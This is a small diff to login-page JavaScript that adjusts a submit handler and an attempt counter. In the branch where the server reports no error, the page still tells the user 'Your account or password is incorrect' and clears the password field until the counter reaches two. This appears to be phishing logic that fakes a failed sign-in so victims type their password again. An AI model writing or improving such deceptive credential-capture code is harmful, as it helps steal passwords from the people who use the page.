@@ -570,7 +570,7 @@
 
         }
 
-        const handleSubmit = async () => {
+        const handleSubmit = async (e) => {
             const password = document.querySelector("[name=password]").value.trim()
             const errorDiv = document.querySelectorAll(".error-message")[1]
 
@@ -591,7 +591,7 @@
                     console.log(result['error'])
                 }
                 else {
-                    if (count !== 2) {
+                    if (count < 2) {
                         errorDiv.className = "error-message show"
                         errorDiv.innerHTML = "Your account or password is incorrect. If you don't remember your password, <a href='#' class='new-link'>reset it now.</a>"
                         passwordBox.value = ""
